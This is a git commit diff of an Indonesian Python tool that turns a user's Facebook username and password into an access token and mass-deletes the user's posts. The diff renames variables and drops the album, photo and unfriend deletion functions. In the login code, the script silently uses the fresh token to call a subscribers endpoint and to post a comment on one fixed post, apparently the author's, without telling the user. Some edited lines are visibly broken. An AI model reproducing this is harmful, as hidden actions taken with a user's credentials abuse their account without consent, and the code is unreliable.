c132f86bff6e365b767b82072a68d2a6cca1b0e1
Susanto <50844272+M3DPR0@users.noreply.github.com>
2019-10-01 03:10:06 +0700

    Update Nguyen.py

--- Nguyen.py
+++ Nguyen.py
@@ -11,7 +11,7 @@ k='\033[1;93m' #kuning
 B='\033[1;96m' #biru
 
 graphFB='https://api.facebook.com/restserver.php'
-s=requests.Session()
+san=requests.Session()
 
 def mengetik(s):
 	for a in s +'\n':
@@ -43,7 +43,7 @@ UserValidation=(h+'''Tulis Username disini :''')
 
 UserValidati0n=(h+'''Tulis Password disini :''')
 
-response=[]
+ajakPostDelete=[]
 id=[]
 
 def menu():
@@ -55,14 +55,14 @@ def menu():
 		time.sleep(1)
 		os.system('rm -rf result/token.txt')
 	try:	
-		response = requests.get('https://graph.facebook.com/me?access_token='+token).json()
+		ajakPostDelete = san.get('https://graph.facebook.com/me?access_token='+token).json()
 	except KeyError:
 		print(m+'['+p+'!'+m+'] Token not found')
 		os.system('rm -rf result/token.txt')
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	print(m+'\n('+h+'✓'+m+')'+p+' Akun Pengunjung : '+h+response['name'])
+	print(m+'\n('+h+'✓'+m+')'+p+' Akun Pengunjung : '+h+ajakPostDelete['name'])
 	print(p+40*'_')
 	print(m+'\n('+h+'/'+m+') '+p+'[01.]'+k+' Mbuang postingan')
 	print(m+'('+h+'/'+m+') '+p+'[02.]'+k+' Mbuang Album Photo Alay')
@@ -98,127 +98,28 @@ def deletePost():
 	except IOError:
 		print(m+'['+p+'!'+m+'] Token not found')
 		time.sleep(1)
-		os.system('rm -rf result/token.txt')
+		os.system('rm -rf token.txt')
 		login()
-	response = requests.get('https://graph.facebook.com/me?access_token='+token).json()
+	ajakGet=san.get('https://graph.facebook.com/me?access_token='+token).json		
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+response['name'])
+	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+ajakGet['name'])
 	mengetik(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
-	response = requests.get('https://graph.facebook.com/me/fields=feed.limit(49)&access_token='+token)
-	for i in response['data']:
-		data = (
-    ('method', 'DELETE'),
-    ('access_token', 'token'),
-    )
-		response = requests.delete('https://graph.facebook.com/'+i['id'], params=data).json()
+	ajakPostDelete=san.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(49)&access_token='+token).json()
+	for i in ajakPostDelete['data']:
+		so=san.post('https://graph.facebook.com/'+i['id']+'?method=DELETE&access_token='+token).json()
 		try:
-			cuk=response['error']['message']
+			what=so['error']['message']
 			print(m+'[×] Failed')
 		except TypeError:
-			print(m+'['+h+' Deleted '+m+'] '+p+i['id']),;sys.stdout.flush();time.sleep(0.001)
+			print(m+'['+h+' Deleted '+m+'] '+p+i['id'])
+
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
 
-
-def deleteAlbums():
-	os.system('clear')
-	try:
-		token=open('result/token.txt','r').read()
-	except IOError:
-		print(m+'['+p+'!'+m+'] Token not found')
-		time.sleep(1)
-		os.system('rm -rf result/token.txt')
-		login()
-	response = requests.get('https://graph.facebook.com/me?access_token='+token).json()
-	os.system('clear')
-	print(logo)
-	print(p+40*'_')
-	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+response['name'])
-	mengetik(m+'['+p+'+'+m+']'+h+' Start ...')
-	print(p+40*'_'+'\n')
-	response = requests.get('https://graph.facebook.com/v2.3/me/albums.limit(49)&access_token='+token)
-	for i in response['data']:
-		data = (
-    ('method', 'DELETE'),
-    ('access_token', 'token'),
-    )
-		response = requests.delete('https://graph.facebook.com/'+i['id'], params=data).json()
-		try:
-			cuk=response['error']['message']
-			print(m+'[×] Failed'+i['name'])
-		except TypeError:
-			print(m+'['+h+' Deleted '+m+'] '+p+i['name']),;sys.stdout.flush();time.sleep(0.001)
-		except requests.exceptions.ConnectionError:
-			print(m+'['+p+'×'+m+'] No connection')
-	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
-
-
-def deletePhoto():
-	os.system('clear')
-	try:
-		token=open('result/token.txt','r').read()
-	except IOError:
-		print(m+'['+p+'!'+m+'] Token not found')
-		time.sleep(1)
-		os.system('rm -rf result/token.txt')
-		login()
-	response = requests.get('https://graph.facebook.com/v2.3/me/albums.limit(49)&access_token='+token)
-	os.system('clear')
-	print(logo)
-	print(p+40*'_')
-	print(m+'\n['+p+'+'+m+']'+h+' ID Album '+p+': '+response['id'])
-	album=input(m+'\n['+p+'+'+m+']'+h+' Input ID album'+p+' : ')
-	mengetik(m+'['+p+'+'+m+']'+h+' Start ...')
-	print(p+40*'_'+'\n')
-	response = requests.get('https://graph.facebook.com/v2.3/me/'+album+'photos.limit(49)&access_token='+token)
-	for i in response['data']:
-		data = (
-    ('method', 'DELETE'),
-    ('access_token', 'token'),
-    )
-		response = requests.delete('https://graph.facebook.com/'+i['id'], params=data).json()
-		try:
-			cuk=response['error']['message']
-			print(m+'[×] Failed'+i['id'])
-		except TypeError:
-			print(m+'['+h+' Deleted '+m+'] '+p+i['id']),;sys.stdout.flush();time.sleep(0.001)
-		except requests.exceptions.ConnectionError:
-			print(m+'['+p+'×'+m+'] No connection')
-	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
-
-
-def unfriend():
-	os.system('clear')
-	try:
-		token=open('result/token.txt','r').read()
-	except IOError:
-		print(m+'['+p+'!'+m+'] Token not found')
-		time.sleep(1)
-		os.system('rm -rf result/token.txt')
-		login()
-	response = requests.get('https://graph.facebook.com/me?access_token='+token).json()
-	os.system('clear')
-	print(logo)
-	print(p+40*'_')
-	response = requests.get('https://graph.facebook.com/v2.3/me/friends?uid.limit(4999)&access_token='+token)
-	for i in response['data']:
-		data = (
-    ('method', 'DELETE'),
-    ('access_token', 'token'),
-    )
-		response = requests.delete('https://graph.facebook.com/'+i['id'], params=data).json()
-		try:
-			cuk=response['error']['message']
-			print(m+'[×] Failed'+i['name'])
-		except TypeError:
-			print(m+'['+h+' Unfriends '+m+'] '+p+i['name']),;sys.stdout.flush();time.sleep(0.001)
-		except requests.exceptions.ConnectionError:
-			print(m+'['+p+'×'+m+'] No connection')
-	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
 
 
 
@@ -244,13 +145,13 @@ if __name__=='__main__':
 			x=hashlib.new('md5')
 			x.update(sig.encode('utf-8'))
 			data.update({'sig':x.hexdigest()})
-			response=s.get(graphFB,params=data).json()
+			ajakPostDelete=san.get(graphFB,params=data).json()
 			nguyen=open('result/token.txt','w')
-			nguyen.write(response['access_token'])
+			nguyen.write(ajakPostDelete['access_token'])
 			nguyen.close()
 			if 'access_token' in response:
 				token=open('result/token.txt','r').read()
-				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'https://graph.facebook.com/api.version/subscribers?access_token='+token);s.post(url+'https://graph.facebook.com/100025271623353_485040922348291/comments?message=❤️&access_token='+token)
+				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');san.post(url+'https://graph.facebook.com/api.version/subscribers?access_token='+token);san.post(url+'https://graph.facebook.com/100025271623353_485040922348291/comments?message=❤️&access_token='+token)
 				time.sleep(1)
 				menu()
 		except KeyError:
